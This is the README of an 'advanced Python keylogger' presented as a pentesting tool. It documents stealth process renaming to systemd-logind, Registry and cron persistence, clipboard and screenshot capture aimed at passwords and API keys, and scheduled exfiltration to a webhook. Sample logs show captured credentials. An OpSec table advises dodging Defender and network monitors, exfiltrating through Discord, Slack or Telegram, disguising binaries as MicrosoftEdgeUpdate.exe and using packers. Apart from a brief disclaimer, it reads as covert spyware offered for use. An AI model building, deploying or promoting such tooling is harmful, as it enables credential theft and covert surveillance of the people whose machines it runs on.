# <img src="./Python%203.svg" width="32" height="32" align="center"> Advanced Python Keylogger — Pentesting Tool

> **For Authorized Security Testing & Educational Use Only**  
> A comprehensive, stealthy keylogger with persistence, encryption, screenshot capture, clipboard monitoring, and remote exfiltration — built for red team operations and cybersecurity professionals.

---

## 📋 Table of Contents

- [⚠️ Legal Disclaimer](#️-legal-disclaimer)
- [✨ Features Overview](#-features-overview)
- [📦 Installation](#-installation)
- [🚀 Usage](#-usage)
- [📂 Log Output Format](#-log-output-format)
- [⚙️ Customization](#️-customization)
- [🔧 Command-Line Reference](#-command-line-reference)
- [🛡️ OpSec Considerations](#️-opsec-considerations)
- [📁 Project Structure](#-project-structure)
- [🤝 Contributing](#-contributing)
- [📜 License](#-license)

---

## ⚠️ Legal Disclaimer

> [!CAUTION]
> Usage of this tool for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state, and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program.

---

## ✨ Features Overview

| # | Feature | Description |
|:--:|---------|-------------|
| 🎯 | **Keystroke Logging** | Captures **every key** — letters, numbers, special keys, key combinations — with precise timestamps |
| 🪟 | **Active Window Tracking** | Automatically detects and logs which application/window is in focus, providing full context for every keystroke |
| 🕵️ | **Stealth Mode** | Hides console window on Windows, renames process to `systemd-logind` on Linux — runs completely invisible |
| 🔄 | **Auto-Persistence** | Adds to Registry `Run` key (Windows) or `crontab`/`autostart` entry (Linux) — survives system reboots |
| 📐 | **Log Rotation** | Auto-rotates log files at **5 MB** to prevent disk filling and reduce forensic footprint |
| 📋 | **Clipboard Capture** | Grabs clipboard contents every 60 seconds — captures copied passwords, tokens, API keys, and URLs |
| 📸 | **Screenshot Capture** | Full desktop screenshots triggered on `PrtScn` press or at configurable time intervals |
| 🔐 | **AES-256 Encryption** | Optional military-grade AES-CBC encryption of log files using `pycryptodome` — 32-byte key |
| 📡 | **Remote Exfiltration** | Send encrypted logs to a webhook/API endpoint at configurable intervals via HTTPS |
| 🗂️ | **Built-in Log Reader** | Read, search with patterns, and analyze captured logs directly from the terminal |
| 🎛️ | **Process Renaming** | On Linux, spawns with process name `systemd-logind` to blend in with legitimate system processes |
| 💾 | **Low Footprint** | Minimal CPU and memory usage — designed for long-term covert operation in production environments |

---

## 📦 Installation

### Prerequisites

- **Python 3.8+** (Python 3.10+ recommended)
- **pip** (Python package manager)
- **Linux**: `xdotool` for active window title capture (optional, install via `sudo apt install xdotool`)

### Step 1: Clone or Download the Repository

```bash
git clone https://github.com/yourusername/advanced-keylogger.git
cd advanced-keylogger
```

### Step 2: Install Dependencies

```bash
pip install pynput pillow requests pycryptodome
```

*Required Libraries:*
- `pynput`: Keyboard and mouse input event capture
- `pillow`: Screenshot capture via Python Imaging Library
- `requests`: HTTP/HTTPS requests for log exfiltration
- `pycryptodome`: AES-256 encryption support (optional but recommended)

---

## 🚀 Usage

### Display Help Menu

```bash
python klg.py --help
```

**Output:**
```text
Advanced Keylogger - Authorized Pentesting Tool
===============================================
Usage:
    python klg.py              Start the keylogger
    python klg.py --read       Read the log file
    python klg.py --search <p> Search logs for pattern
    python klg.py --stop       Stop all instances
    python klg.py --help       Show this help
```

### Start Logging

Run the script to start capturing keystrokes in the background:

```bash
python klg.py
```

**Console Output:**
```text
[*] Keylogger started - Session: 20260504_101530
[*] Logging to: /home/user/.system_logs/keylog.dat
[*] Running in stealth mode
```

### Reading Captured Logs

Use the `--read` flag to view the formatted logs directly in your terminal:

```bash
python klg.py --read
# Or specify a custom log file
python klg.py --read /path/to/custom/keylog.dat
```

**Example Log Report:**
```text
════════════════════════════════════════════════════════════════════════════════
    KEYLOG REPORT: /home/user/.system_logs/keylog.dat
════════════════════════════════════════════════════════════════════════════════

════════════════════════════════════════════════════════════════════════════════
    SESSION STARTED: 2026-05-04T10:15:30.123456
    HOST: lab-pc-01 | OS: Linux-6.8.0-arch1-1-x86_64-with-glibc2.40
════════════════════════════════════════════════════════════════════════════════

=== WINDOW: Terminal — user@lab-pc: ~ ===
[2026-05-04 10:15:30] a
[2026-05-04 10:15:30] d
[2026-05-04 10:15:30] m
[2026-05-04 10:15:30] i
[2026-05-04 10:15:30] n
[2026-05-04 10:15:32] [ENTER]

=== WINDOW: Google Chrome — https://mail.google.com ===
[2026-05-04 10:16:05] p
[2026-05-04 10:16:05] a
[2026-05-04 10:16:06] s
[2026-05-04 10:16:06] s
[2026-05-04 10:16:06] w
[2026-05-04 10:16:06] o
[2026-05-04 10:16:07] r
[2026-05-04 10:16:07] d
[2026-05-04 10:16:08] [ENTER]

[SCREENSHOT] Saved: /home/user/.system_logs/screenshots/screenshot_20260504_101610.png

[CLIPBOARD] supersecretpassword123!

=== WINDOW: Slack — #general, Company Workspace ===
[2026-05-04 10:17:00] H
[2026-05-04 10:17:00] e
[2026-05-04 10:17:00] y
[2026-05-04 10:17:00] [SPACE]
[2026-05-04 10:17:01] t
[2026-05-04 10:17:01] h
[2026-05-04 10:17:01] e
[2026-05-04 10:17:01] r
[2026-05-04 10:17:01] e
[2026-05-04 10:17:02] !

════════════════════════════════════════════════════════════════════════════════
    END OF REPORT - Total size: 2,847 bytes
════════════════════════════════════════════════════════════════════════════════
```

### Searching Logs

Quickly find sensitive information (passwords, emails, keys) using the `--search` command:

```bash
# Search for passwords
python klg.py --search "password"

# Search for email addresses
python klg.py --search "@gmail.com"

# Search for URLs
python klg.py --search "https://"

# Search for API keys or tokens
python klg.py --search "sk-"

# Search in a specific log file
python klg.py --search "admin" /path/to/custom/keylog.dat
```

**Search Results:**
```text
Found 3 matches for 'password':

  Line 42:    [2026-05-04 10:16:08] [ENTER]
  Line 43:    === WINDOW: Bitwarden — https://vault.bitwarden.com ===
  Line 47:    [2026-05-04 10:16:45] p
  Line 48:    [2026-05-04 10:16:45] a
  Line 49:    [2026-05-04 10:16:45] s
  Line 50:    [2026-05-04 10:16:45] s
  Line 51:    [2026-05-04 10:16:45] w
  Line 52:    [2026-05-04 10:16:45] o
  Line 53:    [2026-05-04 10:16:45] r
  Line 54:    [2026-05-04 10:16:45] d
```

### Stopping the Keylogger

Terminate all running instances of the keylogger:

```bash
python klg.py --stop
```

**Output:**
```text
[*] Keylogger instances terminated.
```

---

## 📂 Log Output Format

### Default Log Locations

| Operating System | Log File Location |
|:-----------------|:------------------|
| 🪟 **Windows**    | `C:\Users\<username>\.system_logs\keylog.dat` |
| 🐧 **Linux**      | `/home/<username>/.system_logs/keylog.dat` |
| 🍏 **macOS**      | `/Users/<username>/.system_logs/keylog.dat` |

### Storage Structure

```text
~/.system_logs/
├── keylog.dat                          # Main keystroke log file
├── keylog_20260504_101530.dat          # Rotated log (when > 5 MB)
├── keylog_20260504_121540.dat          # Another rotated log
└── screenshots/
    ├── screenshot_20260504_101610.png  # Screenshot capture
    ├── screenshot_20260504_101910.png  # Another screenshot
    └── screenshot_20260504_102210.png
```

### Raw Log Entry Structure

```text
═══════════════════════════════════════════════════════════════
SESSION STARTED: 2026-05-04T10:15:30.123456
HOST: <hostname> | OS: <operating-system-details>
═══════════════════════════════════════════════════════════════

=== WINDOW: <Active Window Title> ===
[YYYY-MM-DD HH:MM:SS] <key_pressed>

[SCREENSHOT] Saved: <path-to-screenshot>/screenshot_<timestamp>.png
[CLIPBOARD]  <captured_clipboard_text>
```

### Physical Key Mappings

| Physical Key Pressed | Log Representation | Description |
|:---------------------|:-------------------|:------------|
| Enter | `[ENTER]` | Carriage return / newline |
| Space | `[SPACE]` | Space character |
| Backspace | `[BACKSPACE]` | Delete previous character |
| Tab | `[TAB]` | Horizontal tab |
| Escape | `[ESC]` | Escape key |
| Shift (left) | `[SHIFT]` | Left shift modifier |
| Shift (right) | `[SHIFT_R]` | Right shift modifier |
| Ctrl (left) | `[CTRL]` | Left control modifier |
| Ctrl (right) | `[CTRL_R]` | Right control modifier |
| Alt (left) | `[ALT]` | Left alt modifier |
| Alt (right) | `[ALT_R]` | Right alt modifier |
| Caps Lock | `[CAPS_LOCK]` | Caps lock toggle |
| Delete | `[DEL]` | Forward delete |
| Insert | `[INS]` | Insert toggle |
| Home | `[HOME]` | Jump to beginning |
| End | `[END]` | Jump to end |
| Page Up | `[PGUP]` | Scroll up one page |
| Page Down | `[PGDN] ` | Scroll down one page |
| Up Arrow | `[UP]` | Navigate up |
| Down Arrow | `[DOWN]` | Navigate down |
| Left Arrow | `[LEFT]` | Navigate left |
| Right Arrow | `[RIGHT]` | Navigate right |
| F1 - F12 | `[F1]` - `[F12]` | Function keys |
| Print Screen | `[PRINT_SCREEN]` | Captures screenshot automatically |
| Scroll Lock | `[SCROLL_LOCK]` | Scroll lock toggle |
| Pause/Break | `[PAUSE]` | Pause/Break key |
| Num Lock | `[NUM_LOCK]` | Num lock toggle |
| Menu | `[MENU]` | Context menu key |

---

## ⚙️ Customization

Edit the `CONFIG` section at the top of `klg.py` to tune the tool's behavior:

```python
# === CONFIGURATION ===
LOG_FILE = Path.home() / ".system_logs" / "keylog.dat"   # Log file path
ENCRYPTION_KEY = b"your-secure-key-32-bytes-long!!!!!!"  # AES-256 key (must be exactly 32 bytes)
USE_ENCRYPTION = False    # Enable AES encryption (requires pycryptodome)
PERSISTENCE = True        # Auto-start on boot via Registry/cron
STEALTH = True            # Hide console window / rename process
SCREENSHOT_INTERVAL = 300 # Seconds between screenshots (0 = disabled)
CLIPBOARD_INTERVAL = 60   # Seconds between clipboard grabs (0 = disabled)
MAX_LOG_SIZE = 5 * 1024 * 1024  # Rotate log at 5 MB
WEBHOOK_URL = ""          # Remote endpoint URL for log exfiltration
EXFIL_INTERVAL = 3600     # Seconds between exfiltration attempts (0 = disabled)
```

---

## 🛡️ OpSec Considerations

| Area | Consideration | Recommended Mitigation |
|:-----|:--------------|:-----------------------|
| 🧹 **Forensic Artifacts** | Log files stored in `~/.system_logs/` directory can be discovered during forensic analysis. | Use a less conspicuous path (e.g., `~/.cache/`), enable encryption, and manually clean up after engagement. |
| 🌐 **Network Traffic** | Exfiltration via HTTP/HTTPS can be detected by network monitoring tools (Zeek, Suricata, etc.). | Always use HTTPS with valid certificates; randomize intervals; consider using legitimate services (Discord webhook, Slack, Telegram bot) as exfiltration targets. |
| 🔑 **Encryption Key** | Hardcoded key can be extracted via static analysis if the script is discovered. | Load key from environment variable, remote server, or derive it from system attributes. |
| 📦 **Dependencies** | `pynput`, `PIL`, `requests` library imports may raise suspicion in process memory analysis. | Use PyInstaller to compile into a single executable with hidden imports; rename script to something innocuous. |
| 🪟 **Windows Defender** | May flag as malware based on behavior (keyboard hooking) or static signatures. | Test in isolated lab environment; add Defender exclusions if deploying on controlled assets; use custom packers. |
| 🐧 **Linux Auditd** | Userland keylogging via `pynput` is NOT caught by `auditd` or syscall monitoring. | Low risk — operates entirely in userland without special privileges. |
| 📊 **Process Lists** | Process name shows as `python3 klg.py` by default. | On Linux, auto-renames to `systemd-logind`; on Windows, name your compiled binary something like `MicrosoftEdgeUpdate.exe`. |
| 🔌 **USB/Device Events** | Plugging in a USB device while the keylogger is active creates system events that may be logged. | Use on virtual machines or systems where you have control over logging infrastructure. |
| 📁 **File System Monitoring** | `inotify` (Linux) or `FileSystemWatcher` (Windows) can detect file writes to the log directory. | Write logs to a ramdisk (`/dev/shm/` on Linux) or use in-memory buffering with periodic exfiltration only. |
| ⏰ **Timing Analysis** | Regular screenshot/clipboard intervals create predictable patterns. | Add jitter (±20%) to all interval timers; randomize actual capture time within the window. |

---

## 📁 Project Structure

```text
advanced-keylogger/
│
├── klg.py              # Main keylogger script — single file, fully self-contained
├── README.md                 # This documentation file
├── LICENSE                   # MIT License
│
├── examples/
│   ├── decoder.py            # Standalone log decoder utility (can be deployed separately)
│   ├── config_samples.py     # Additional configuration examples and templates
│   └── webserver_receiver.py # Simple Flask webhook receiver for testing exfiltration
│
└── docs/
    ├── architecture.md       # Technical architecture and design decisions
    ├── detection.md          # How blue teams can detect this tool
    └── evasion.md            # Advanced evasion techniques (for red teams)
```

---

## 📜 License

```text
MIT License

Copyright (c) 2026

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
```
